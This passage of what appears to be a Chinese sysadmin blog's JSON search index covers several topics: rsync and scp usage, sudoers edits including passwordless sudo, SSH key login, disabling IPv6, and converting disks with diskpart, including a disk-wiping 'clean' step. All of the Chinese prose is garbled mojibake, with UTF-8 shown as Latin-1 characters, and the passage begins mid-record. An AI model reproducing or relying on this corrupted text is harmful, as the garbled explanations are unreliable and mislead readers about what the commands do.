æ–‡ä»¶æ‰€æœ‰è€… -v æ˜¾ç¤ºè¿‡ç¨‹ -P æ˜¾ç¤ºä¼ è¾“è¿›åº¦ç™¾åˆ†ç™¾ -z ä¼ è¾“çš„æ—¶å€™è¿›è¡Œå‹ç¼© -e â€œssh -p22â€ æŒ‡å®šsshç«¯å£å· â€“deleteÂ ä¿æŒç›®æ ‡ä¸åŸå§‹ç›®å½•ä¸€æ¨¡ä¸€æ ·Â åˆ é™¤ä¸åŒçš„éƒ¨åˆ† æ’é™¤ â€“exclude=03.txt â€“exclude-from æ ¹æ®æä¾›çš„æ–‡ä»¶å†…å®¹è¿›è¡Œæ’é™¤ï¼ˆæ–‡ä»¶å†…å®¹ä¸€è¡Œä¸€ä¸ªè·¯å¾„å³å¯ï¼‰ ä½¿ç”¨æ ¼å¼ï¼š rsync å‚æ•° è¦ä¼ è¾“çš„æ–‡ä»¶æˆ–ç›®å½• ç›®æ ‡è·¯å¾„ ä¸¾ä¾‹ï¼š #å°†æœ¬åœ°/etc/sysconfig ç›®å½•ä¼ è¾“åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸­ rsync -avz /etc/sysconfigÂ 172.16.1.31:/tmp ","date":"2019-02-12 12:13","objectID":"/post/190/:0:0","tags":["rsync"],"title":"rsyncåŸºæœ¬ä½¿ç”¨","uri":"/post/190/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"scp (secure rcp)Â ä¸åŒæœºå™¨ä¹‹é—´ä¼ è¾“Â æ¯æ¬¡ä¼ è¾“éƒ½æ˜¯å…¨é‡ rsyncÂ å¤‡ä»½ åœ¨ä¸åŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“Â å¢åŠ ä¼ è¾“ åªä¼ è¾“å‘ç”Ÿå˜åŒ–çš„ æˆ–è€…æ˜¯æ–°æ–‡ä»¶ ä½¿ç”¨æ ¼å¼ï¼š scp è¦å¤åˆ¶çš„æ–‡ä»¶è·¯å¾„Â ç›®æ ‡è·¯å¾„ -rÂ å¤åˆ¶ç›®å½• -pÂ ä¿ç•™åŸæ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ï¼Œè®¿é—®æ—¶é—´å’Œè®¿é—®æƒé™ã€‚ -PÂ æŒ‡å®šè¿œç¨‹ç«¯å£å· #ä½¿ç”¨ï¼šscp -P 4588 è¦å¤åˆ¶çš„æ–‡ä»¶è·¯å¾„Â ç›®æ ‡è·¯å¾„ #æœ¬åœ° /etc/hostname æ–‡ä»¶å‘é€åˆ° nfs01 çš„/tmpç›®å½•ä¸­ [root@backup ~]# scpÂ /etc/hostnameÂ 172.16.1.31:/tmp root@172.16.1.31â€™s password: hostnameÂ 100%Â 7Â 3.1KB/sÂ 00:00 #å¤åˆ¶è¿œç¨‹ä¸»æœº/tmp/xx.txtæ–‡ä»¶ åˆ°æœ¬åœ°/tmpç›®å½•ä¸‹ scp -PÂ 4588 root@172.16.1.31:/tmp/xx.txt /tmp ","date":"2019-02-11 22:56","objectID":"/post/162/:0:0","tags":["linux"],"title":"scpç®€å•ä½¿ç”¨","uri":"/post/162/"},{"categories":["å…¶ä»–"],"content":"Ubuntuä¸‹æ™®é€šç”¨æˆ·ç”¨sudoæ‰§è¡Œå‘½ä»¤æ—¶æŠ¥\"xxx is not in the sudoers file.This incident will be reported\"é”™è¯¯ï¼Œè§£å†³æ–¹æ³•å°±æ˜¯åœ¨/etc/sudoersæ–‡ä»¶é‡Œç»™è¯¥ç”¨æˆ·æ·»åŠ æƒé™ã€‚å¦‚ä¸‹ï¼š 1.åˆ‡æ¢åˆ°rootç”¨æˆ·ä¸‹ 2./etc/sudoersæ–‡ä»¶é»˜è®¤æ˜¯åªè¯»çš„ï¼Œå¯¹rootæ¥è¯´ä¹Ÿæ˜¯ï¼Œå› æ­¤éœ€å…ˆæ·»åŠ sudoersæ–‡ä»¶çš„å†™æƒé™,å‘½ä»¤æ˜¯: chmod u+w /etc/sudoers 3.ç¼–è¾‘sudoersæ–‡ä»¶ vi /etc/sudoers æ‰¾åˆ°è¿™è¡Œ root ALL=(ALL) ALL,åœ¨ä»–ä¸‹é¢æ·»åŠ xxx ALL=(ALL) ALL (è¿™é‡Œçš„xxxæ˜¯ä½ çš„ç”¨æˆ·å) ps:è¿™é‡Œè¯´ä¸‹ä½ å¯ä»¥sudoersæ·»åŠ ä¸‹é¢å››è¡Œä¸­ä»»æ„ä¸€æ¡ youuserÂ ALL=(ALL)Â ALL %youuserÂ ALL=(ALL)Â ALL youuserÂ ALL=(ALL)Â NOPASSWD: ALL %youuserÂ ALL=(ALL)Â NOPASSWD: ALL ç¬¬ä¸€è¡Œ:å…è®¸ç”¨æˆ·youuseræ‰§è¡Œsudoå‘½ä»¤(éœ€è¦è¾“å…¥å¯†ç ). ç¬¬äºŒè¡Œ:å…è®¸ç”¨æˆ·ç»„youuseré‡Œé¢çš„ç”¨æˆ·æ‰§è¡Œsudoå‘½ä»¤(éœ€è¦è¾“å…¥å¯†ç ). ç¬¬ä¸‰è¡Œ:å…è®¸ç”¨æˆ·youuseræ‰§è¡Œsudoå‘½ä»¤,å¹¶ä¸”åœ¨æ‰§è¡Œçš„æ—¶å€™ä¸è¾“å…¥å¯†ç . ç¬¬å››è¡Œ:å…è®¸ç”¨æˆ·ç»„youuseré‡Œé¢çš„ç”¨æˆ·æ‰§è¡Œsudoå‘½ä»¤,å¹¶ä¸”åœ¨æ‰§è¡Œçš„æ—¶å€™ä¸è¾“å…¥å¯†ç . 4.æ’¤é”€sudoersæ–‡ä»¶å†™æƒé™,å‘½ä»¤: chmod u-w /etc/sudoers æœ¬æ–‡è½¬è‡ªï¼šhttp://www.linuxidc.com/Linux/2016-07/133066.htm ","date":"2017-06-21 18:03","objectID":"/post/138/:0:0","tags":["linux"],"title":"UbuntuæŠ¥â€œxxx is not in the sudoers fileThis incident...â€é”™è¯¯è§£å†³æ–¹æ³•","uri":"/post/138/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1.æŒ‰ç…§ä»¥ä¸‹æç¤ºè¾“å…¥å³å¯ root@localhost ~]# ssh-keygen -t rsa //é‡‡ç”¨rsaçš„åŠ å¯†æ–¹å¼çš„å…¬é’¥/ç§é’¥ Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): //è¯¢é—®è¾“å…¥ç§é’¥å’Œå…¬é’¥æ”¾åœ¨é‚£é‡Œï¼Œç›´æ¥å›è½¦ Enter passphrase (empty for no passphrase): //è¿™é‡Œå¯ä»¥ç»™ç§é’¥è®¾ç½®å¯†ç  Enter same passphrase again: //æç¤ºå†æ¬¡è¾“å…¥ç§é’¥å¯†ç ï¼Œå†æ¬¡å›è½¦ 2.è¿›å…¥å¯†é’¥ç›®å½• [root@localhost ~]# cd /root/.ssh 3.lsæŸ¥çœ‹æ–‡ä»¶å¯ä»¥çœ‹åˆ°ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ [root@localhost .ssh]# ls id_rsa id_rsa.pub 4.å¯¼å…¥å…¬é’¥åˆ°è®¤è¯æ–‡ä»¶ä¸­ [root@localhost .ssh]# mv id_rsa.pub authorized_keys 5.ç»™è®¤è¯æ–‡ä»¶ä¿®æ”¹æƒé™600 [root@localhost .ssh]# chmod 600 authorized_keys 6.å°†é…ç½®æ–‡ä»¶ä¸­PasswordAuthentication yes æ”¹ä¸º PasswordAuthentication no //ç¦æ­¢ä½¿ç”¨å¯†ç è¿œç¨‹ç™»å½•ç³»ç»Ÿ [root@localhost .ssh]# vim /etc/ssh/sshd_config ","date":"2017-06-21 17:57","objectID":"/post/134/:0:0","tags":["å¯†é’¥","ç§é’¥","linux","è¿œç¨‹"],"title":"linuxç³»ç»Ÿä½¿ç”¨å¯†é’¥éªŒè¯è¿œç¨‹ç™»å½•","uri":"/post/134/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1./etc/sysconfig/network æ–°å¢å¦‚ä¸‹ä¸€è¡Œ NETWORKING_IPV6=off åœ¨ /etc/modprobe.d/dist.confå¢åŠ ä»¥ä¸‹å†…å®¹ alias net-pf-10 off options ipv6 disable=1 å…³é—­ip6iptablesè‡ªå¯ chkconfig ip6tables off 4.rebooté‡å¯ ","date":"2017-06-12 10:40","objectID":"/post/92/:0:0","tags":[],"title":"Centos6å…³é—­ipv6","uri":"/post/92/"},{"categories":["windowsç³»ç»Ÿ"],"content":"ç¬¬ä¸€æ­¥ã€æˆ‘ä»¬ä¸‹é¢è¿™ä¸ªç•Œé¢æŒ‰ä¸‹Shift+F10ï¼Œä¼šå‡ºç°ç¬¬äºŒæ­¥ä¸­çš„å‘½ä»¤æç¤ºç¬¦ç•Œé¢ ç¬¬äºŒæ­¥ã€è¾“å…¥diskpartå‘½ä»¤å›è½¦è¿è¡Œå·¥å…·ï¼Œç„¶åè¾“å…¥list diskæŸ¥çœ‹ç£ç›˜ï¼Œå¦‚ä¸‹å›¾ ç¬¬ä¸‰æ­¥ã€è¾“å…¥seclect disk 0ï¼Œé€‰ä¸­ç£ç›˜ï¼ˆæ³¨æ„ç£ç›˜ç¼–å·ï¼Œä¸è¦å†™é”™ï¼‰ ç¬¬å››æ­¥ã€é€‰ä¸­ç£ç›˜åä¾æ¬¡è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ 1ã€clean //è¾“å…¥æ­¤å‘½ä»¤å‰è¯·åŠ¡å¿…ç¡®å®šç¡¬ç›˜æ— é‡è¦æ•°æ®ï¼Œè¯¥å‘½ä»¤ä¼šæ¸…é™¤ç£ç›˜ 2ã€convert gpt //å°†ç£ç›˜è½¬æ¢ä¸ºGPTæ ¼å¼ convert mbr //å°†ç£ç›˜è½¬æ¢ä¸ºMBRæ ¼å¼ ä¸Šé¢ä¸¤ä¸ªæ ¹æ®éœ€è¦è¾“å…¥ä¸€æ¡å³å¯ 3ã€list partition //æŸ¥çœ‹ç£ç›˜åˆ†åŒºä¿¡æ¯ ç¬¬äº”æ­¥ã€åˆ›å»ºåˆ†åŒº 1ã€create partition efi size=100 //åˆ›å»ºEFIåˆ†åŒºï¼Œå¤§å°ä¸º100M 2ã€create partition msr size=128 //åˆ›å»ºMSRåˆ†åŒºï¼Œé»˜è®¤å¤§å°æ˜¯128M 3ã€create partition primary size=20000 //åˆ›å»ºä¸»åˆ†åŒºï¼Œsize=20000å°±æ˜¯åˆ†åŒº20Gï¼Œå•ä½æ˜¯Mb 4ã€list partition //æŸ¥çœ‹ç£ç›˜åˆ†åŒºä¿¡æ¯ è‡³æ­¤åˆ†åŒºå®Œæˆï¼Œè¾“å…¥ä¸¤æ¬¡exité€€å‡ºå³å¯ã€‚ ","date":"2017-06-08 21:38","objectID":"/post/18/:0:0","tags":["åˆ†åŒº","windows","GPT","MBR"],"title":"ä½¿ç”¨diskpartå‘½ä»¤æ›´æ”¹ç£ç›˜åˆ†åŒºä¸ºGPTã€MBRæ•™ç¨‹","uri":"/post/18/"}]